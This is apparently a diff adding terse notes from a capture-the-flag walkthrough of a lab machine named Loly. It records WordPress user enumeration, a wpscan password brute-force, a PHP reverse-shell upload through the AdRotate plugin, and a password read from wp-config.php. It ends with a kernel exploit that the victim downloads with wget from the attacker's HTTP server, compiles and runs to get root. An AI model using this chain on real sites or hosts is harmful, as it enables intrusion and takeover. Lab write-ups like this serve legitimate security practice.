@@ -1,0 +1,55 @@
+Lily 192.168.56.118
+
+open port 80
+dirb http://192.168.56.118        
+find wordpress is running but i found issue with domain name loly.lc
+So made entry in the file /etc/hosts
+192.168.56.118  loly.lc
+Now its working fine
+Great
+
+wpscan --url http://loly.lc/wordpress/ --enumerate u
+
+wpscan --url http://loly.lc/wordpress/ -U loly -P /usr/share/wordlists/rockyou.txt 
+Found username and password
+Username: loly, Password: fernando
+AdRotate > Manage Media > Upload files
+
+
+
+locate shell | grep php
+Zip the file 
+zip shell.php.zip shell.php 
+upload file 
+locate the file and you will get reverse shell
+
+http://loly.lc/wordpress/wp-content/banners/shell.php
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+cd /var/www/html
+locate wp-config
+
+cd /var/www/html/wordpress
+cat wp-config.php
+find password lolyisabeautifulgirl
+sudo -l (no luck)
+find / -perm -u=s 2>/dev/null (useless)
+
+uname -a
+
+searchsploit ubuntu 4.4.0-31
+
+locate inux/local/45010.c 
+cp /usr/share/exploitdb/exploits/linux/local/45010.c ./loly.c
+python -m http.server 440
+
+on victim shell
+wget http://192.168.56.112:440/loly.c
+gcc loly.c -o exploit
+
+./exploit
+got root shell
+
+
+
+
+
